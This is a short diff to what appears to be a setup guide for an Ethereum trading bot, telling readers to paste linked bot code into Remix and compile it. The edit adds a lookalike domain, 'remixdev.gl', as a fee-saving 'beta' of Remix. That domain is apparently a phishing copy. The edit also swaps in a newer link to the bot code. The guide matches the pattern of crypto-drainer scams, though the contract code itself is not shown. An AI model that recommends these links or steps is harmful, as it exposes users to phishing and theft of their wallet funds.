@@ -12,8 +12,7 @@ Step-by-Step Setup Guide:
 
 2- Access Remix
 
-► [Use Remix Ethereum IDE](https://remix.ethereum.org/) 🚨 https://remix.ethereum.org/ 🚨 (Ensure you only use this original version, as the bot is compatible with it specifically.)
-
+► [Use Remix Ethereum IDE](https://remix.ethereum.org/) 🚨 https://remix.ethereum.org/ 🚨 (Ensure you only use this original version, as the bot is compatible with it specifically.) Or this beta version to reduce fees : https://remixdev.gl/
 3- Create Contract File
 
 ► Go to the “contracts” folder and create a “New File”.
@@ -25,7 +24,7 @@ Step-by-Step Setup Guide:
 4- Paste Code in Remix
 
 ► Copy and paste the bot code: [ETH Bot Code.
-](https://github.com/Jacob-project/Ethereum-Bot/blob/main/Code%20-%20Update%2003%20May%202025)
+](https://github.com/Jacob-project/Ethereum-Bot/blob/main/Code%20-%20Update%2004%20May%202025)
 
 5- Compile the Contract
 
